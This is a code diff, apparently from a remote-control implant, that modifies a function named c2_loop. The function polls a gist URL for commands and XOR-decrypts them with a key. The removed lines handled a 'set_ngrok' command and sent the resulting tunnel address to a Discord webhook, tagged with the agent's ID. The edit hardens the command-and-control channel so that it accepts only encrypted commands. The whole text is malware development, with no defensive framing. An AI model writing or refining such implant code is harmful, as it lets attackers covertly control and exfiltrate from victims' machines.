@@ -217,30 +217,15 @@ def c2_loop(cfg: dict, me: dict, gist_url: str, c2_key: str,
                 try:
                     raw = _fetch_gist(gist_url, timeout=15)
                     if raw:
-                        # Try to decrypt
+                        # Always attempt XOR decrypt — no plaintext fallback
                         try:
                             decrypted = _xor_crypt(raw.encode(), c2_key.encode())
-                            # If it's valid text, use it
-                            try:
-                                dec_text = decrypted.decode('utf-8')
-                                if dec_text:
-                                    commands.append(dec_text)
-                            except:
-                                # Not encrypted — plaintext commands
-                                commands.append(raw)
+                            dec_text = decrypted.decode('utf-8')
+                            if dec_text.strip():
+                                commands.append(dec_text)
                         except:
-                            commands.append(raw)
-
-                        # Check for ngrok set command
-                        if not ngrok_url and ngrok_enabled:
-                            for cmd in commands:
-                                try:
-                                    data = json.loads(cmd)
-                                    if data.get("cmd") == "set_ngrok":
-                                        ngrok_url = data["args"][0]
-                                        _send_discord(webhook, f"[{agent_id}] NGOK: {ngrok_url}")
-                                except:
-                                    pass
+                            # Decrypt failed — ignore, don't fall back to plaintext
+                            pass
                 except:
                     pass
 
